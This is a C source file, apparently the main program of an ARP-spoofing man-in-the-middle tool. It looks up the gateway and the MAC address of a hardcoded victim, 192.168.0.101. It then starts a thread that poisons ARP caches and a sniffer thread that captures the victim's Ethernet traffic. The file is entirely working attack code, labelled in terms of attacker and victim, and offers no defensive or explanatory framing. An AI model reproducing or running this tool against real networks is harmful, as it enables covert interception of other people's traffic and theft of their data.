#include "core.h"
#include <pthread.h>
#include <signal.h>

int ARP_SOCK = -1;
int ETH_SOCK = -1;
pthread_t ARP_SPOOF_TID = -1;
pthread_t ETH_SNIFFER_TID = -1;
ARPSpoofArgs ARP_SPOOF_ARGS = {0};
ETHSnifferArgs ETH_SNIFFER_ARGS = {0};

void sigint_handler(int sig) {
    ARP_SPOOF_ARGS.is_terminated = 1;
    ETH_SNIFFER_ARGS.is_terminated = 1;
}

void main(void) {
    signal(SIGINT, sigint_handler);

    char* if_name = "wlp1s0";
    u32 victim_addr_hl = inet_addr("192.168.0.101");

    ARP_SOCK = get_arp_socket();

    printf("------------------------------------\n");
    printf("Attacker ip:      ");
    u32 attacker_addr_hl = get_interface_addr_hl(if_name);
    print_addr_l(attacker_addr_hl);
    printf("\n");

    Mac attacker_mac = get_interface_mac(if_name);
    printf("Attacker mac:     ");
    print_mac(attacker_mac);
    printf("\n");

    printf("------------------------------------\n");
    printf("Gateway ip:       ");
    u32 gateway_addr_hl = get_gateway_addr_hl(if_name);
    print_addr_l(gateway_addr_hl);
    printf("\n");

    printf("Gateway mac:      ");
    Mac gateway_mac = {0};
    if (request_target_mac(
            ARP_SOCK, if_name, &gateway_mac, gateway_addr_hl, 1, 10
        )) {
        print_mac(gateway_mac);
    } else {
        printf("ERROR: Can't obtain mac\n");
        exit(1);
    }
    printf("\n");

    printf("------------------------------------\n");
    printf("Victim ip:        ");
    print_addr_l(victim_addr_hl);
    printf("\n");

    printf("Victim mac:       ");
    Mac victim_mac = {0};
    if (request_target_mac(
            ARP_SOCK, if_name, &victim_mac, victim_addr_hl, 1, 10
        )) {
        print_mac(victim_mac);
    } else {
        printf("ERROR: Can't obtain mac\n");
        exit(1);
    }
    printf("\n");

    ARP_SPOOF_ARGS.arp_sock = ARP_SOCK;
    ARP_SPOOF_ARGS.if_name = if_name;
    ARP_SPOOF_ARGS.attacker_mac = attacker_mac;
    ARP_SPOOF_ARGS.gateway_addr_hl = gateway_addr_hl;
    ARP_SPOOF_ARGS.victim_mac = victim_mac;
    ARP_SPOOF_ARGS.victim_addr_hl = victim_addr_hl;
    ARP_SPOOF_ARGS.period_sec = 1;
    ARP_SPOOF_ARGS.is_terminated = 0;

    if (pthread_create(
            &ARP_SPOOF_TID, NULL, start_arp_spoof, (void*)&ARP_SPOOF_ARGS
        )
        != 0) {
        fprintf(
            stderr, "ERROR: Failed to create start_arp_spoof thread\n"
        );
        exit(1);
    }

    printf("------------------------------------\n");
    printf("Spoofing...\n");

    ETH_SOCK = get_eth_socket(if_name);

    ETH_SNIFFER_ARGS.eth_sock = ETH_SOCK;
    ETH_SNIFFER_ARGS.victim_mac = victim_mac;
    ETH_SNIFFER_ARGS.attacker_mac = attacker_mac;
    ETH_SNIFFER_ARGS.gateway_mac = gateway_mac;
    ETH_SNIFFER_ARGS.is_terminated = 0;

    if (pthread_create(
            &ETH_SNIFFER_TID,
            NULL,
            start_eth_sniffer,
            (void*)&ETH_SNIFFER_ARGS
        )
        != 0) {
        fprintf(
            stderr, "ERROR: Failed to create start_eth_sniffer thread\n"
        );
        exit(1);
    }

    pthread_join(ARP_SPOOF_TID, NULL);
    pthread_join(ETH_SNIFFER_TID, NULL);
    close(ARP_SOCK);
    close(ETH_SOCK);
    exit(0);
}
